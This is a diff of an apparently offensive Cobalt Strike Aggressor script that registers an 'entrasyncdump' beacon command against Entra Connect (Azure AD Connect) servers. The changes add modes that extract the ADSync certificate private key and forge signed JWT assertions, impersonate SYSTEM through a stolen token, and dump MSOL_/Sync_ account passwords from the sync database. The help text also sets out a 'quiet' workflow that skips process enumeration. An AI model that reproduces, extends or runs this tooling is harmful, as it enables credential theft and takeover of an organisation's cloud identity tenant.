@@ -3,89 +3,121 @@ beacon_command_register(
     "Entra Connect (Azure AD Connect) certificate dumper",
     "Usage: entrasyncdump <command> [args...]\n\n"
     "Commands:\n"
-    "  version      - Read installed Entra Connect version, SQL instance name, and auth type\n"
-    "  dumpcertinfo - Check for ABA/certificate auth, enumerate cert thumbprints,\n"
-    "                 and extract the application/client ID\n"
-    "  dumpcert     - Extract ADSync private key handle and build a signed JWT assertion\n"
-    "                 for ABA certificate-based authentication\n"
-    "  help         - Show this help message\n\n"
+    "  version       - Read installed Entra Connect version, SQL instance name, and auth type\n"
+    "  dumpcertinfo  - Check for ABA/certificate auth, enumerate cert thumbprints,\n"
+    "                  and extract the application/client ID\n"
+    "  dumpcert      - Extract ADSync private key handle and build a signed JWT assertion\n"
+    "                  (requires admin, does full process enumeration)\n"
+    "  autodumpcert  - One-shot: discover thumbprint, impersonate via PID, sign JWT\n"
+    "                  (requires SYSTEM, no process enumeration, no SQL)\n"
+    "  dumpcreds     - Dump MSOL_/Sync_ password credentials from the ADSync database\n"
+    "                  (requires local admin, for password-based auth installs)\n"
+    "  help          - Show this help message\n\n"
     "Arguments:\n"
-    "  dumpcertinfo [instancename]  - Optional LocalDB instance name override\n"
+    "  dumpcertinfo [instancename]\n"
+    "      Optional LocalDB instance name override\n"
     "  dumpcert <thumbprint> <client_id> <tenant_id>\n"
-    "                              - Certificate thumbprint (40 hex chars),\n"
-    "                                application/client ID, and Azure AD tenant ID\n\n"
-    "Workflow:\n"
+    "      Certificate thumbprint (40 hex chars), application/client ID, and tenant ID\n"
+    "  autodumpcert <pid> <tenant_id> <client_id>\n"
+    "      PID of miiserver.exe (from 'ps'), tenant ID, client ID (from dumpcertinfo)\n"
+    "  dumpcreds [instancename]\n"
+    "      Optional LocalDB instance name override\n\n"
+    "Workflow (manual):\n"
     "  1. Run 'version' to check Entra Connect version and auth type\n"
     "  2. Run 'dumpcertinfo' to get the cert thumbprint and client ID\n"
-    "  3. Run 'dumpcert <thumbprint> <client_id> <tenant_id>' to extract\n"
-    "     the private key and generate a signed JWT assertion\n"
-    "  4. Use the assertion with roadtx or a direct token request\n"
+    "  3. Run 'dumpcert <thumbprint> <client_id> <tenant_id>'\n"
+    "  4. Use the assertion with roadtx or a direct token request\n\n"
+    "Workflow (password-based / MSOL credentials):\n"
+    "  1. Run 'version' to confirm password-based auth\n"
+    "  2. Run 'dumpcreds' (as local admin)\n\n"
+    "Workflow (quiet — requires SYSTEM via steal_token):\n"
+    "  1. steal_token <system_pid>\n"
+    "  2. Find miiserver.exe PID from 'ps'\n"
+    "  3. Run 'autodumpcert <miiserver_pid> <tenant_id>'\n"
+    "  4. rev2self\n"
 );
 
 alias entrasyncdump {
-    local('$bid $cmd $arg1 $arg2 $arg3 $handle $data $args');
+    local('$bid $cmd $arg1 $arg2 $arg3 $handle $data $args $bof_file');
     local('@_parts');
     $bid = $1;
 
-    # CS aliases split args by space: $2 = first arg, $3 = second, etc.
-    # But some CS builds pass $2 as the full remaining string.
-    # Handle both: if $2 contains a space, split it; otherwise use $3/$4/$5.
     if (" " isin $2) {
-        # Full string mode — split manually
         @_parts = split(" ", $2);
         $cmd   = @_parts[0];
         $arg1  = @_parts[1];
         $arg2  = @_parts[2];
         $arg3  = @_parts[3];
     } else {
-        # Individual arg mode — CS already split them
         $cmd  = $2;
         $arg1 = $3;
         $arg2 = $4;
         $arg3 = $5;
     }
 
-    if ($cmd eq "") {
-        berror($bid, "Usage: entrasyncdump <version|dumpcertinfo|dumpcert|help> [args...]");
+    if ($cmd eq "" || $cmd eq "help") {
+        berror($bid, "Usage: entrasyncdump <version|dumpcertinfo|dumpcert|autodumpcert|help> [args...]");
         return;
     }
 
-    if ($cmd ne "version" && $cmd ne "dumpcertinfo" && $cmd ne "dumpcert" && $cmd ne "help") {
+    # Map command to BOF file
+    if ($cmd eq "version") {
+        $bof_file = "entrasyncdump_version";
+    } else if ($cmd eq "dumpcertinfo") {
+        $bof_file = "entrasyncdump_dumpcertinfo";
+    } else if ($cmd eq "dumpcert") {
+        $bof_file = "entrasyncdump_dumpcert";
+    } else if ($cmd eq "autodumpcert") {
+        $bof_file = "entrasyncdump_autodumpcert";
+    } else if ($cmd eq "dumpcreds") {
+        $bof_file = "entrasyncdump_dumpcreds";
+    } else {
         berror($bid, "Unknown command '" . $cmd . "'. Run 'entrasyncdump help' for usage.");
         return;
     }
 
-    # Read the right BOF file
-    println("Reading: entrasyncdump." . barch($bid) . ".o");
-    $handle = openf(script_resource("entrasyncdump." . barch($bid) . ".o"));
+    # Read the BOF
+    $handle = openf(script_resource($bof_file . "." . barch($bid) . ".o"));
     $data = readb($handle, -1);
     closef($handle);
 
     # Pack arguments based on the command
     if ($cmd eq "dumpcert") {
-        # dumpcert requires: thumbprint, client_id, tenant_id
         if ($arg1 eq "" || $arg2 eq "" || $arg3 eq "") {
             berror($bid, "Usage: entrasyncdump dumpcert <thumbprint> <client_id> <tenant_id>");
             return;
         }
-
-        $args = bof_pack($bid, "zzzz", "dumpcert", $arg1, $arg2, $arg3);
-        btask($bid, "Tasked beacon to run entrasyncdump dumpcert (" . sizeof($data) . " bytes)");
+        $args = bof_pack($bid, "zzz", $arg1, $arg2, $arg3);
+        btask($bid, "Tasked beacon to run entrasyncdump dumpcert");
 
     } else if ($cmd eq "dumpcertinfo") {
-        # dumpcertinfo takes an optional instance name override
         if ($arg1 ne "") {
-            $args = bof_pack($bid, "zz", "dumpcertinfo", $arg1);
+            $args = bof_pack($bid, "z", $arg1);
         } else {
-            $args = bof_pack($bid, "z", "dumpcertinfo");
+            $args = bof_pack($bid, "");
         }
+        btask($bid, "Tasked beacon to run entrasyncdump dumpcertinfo");
 
-        btask($bid, "Tasked beacon to run entrasyncdump dumpcertinfo (" . sizeof($data) . " bytes)");
+    } else if ($cmd eq "autodumpcert") {
+        if ($arg1 eq "" || $arg2 eq "" || $arg3 eq "") {
+            berror($bid, "Usage: entrasyncdump autodumpcert <pid> <tenant_id> <client_id>");
+            return;
+        }
+        $args = bof_pack($bid, "izz", int($arg1), $arg2, $arg3);
+        btask($bid, "Tasked beacon to run entrasyncdump autodumpcert (PID: " . $arg1 . ")");
+
+    } else if ($cmd eq "dumpcreds") {
+        if ($arg1 ne "") {
+            $args = bof_pack($bid, "z", $arg1);
+        } else {
+            $args = bof_pack($bid, "");
+        }
+        btask($bid, "Tasked beacon to run entrasyncdump dumpcreds");
 
     } else {
-        # version / help — command only, no extra args
-        $args = bof_pack($bid, "z", $cmd);
-        btask($bid, "Tasked beacon to run entrasyncdump " . $cmd . " (" . sizeof($data) . " bytes)");
+        # version — no args
+        $args = bof_pack($bid, "");
+        btask($bid, "Tasked beacon to run entrasyncdump version");
     }
 
     beacon_inline_execute($bid, $data, "go", $args);
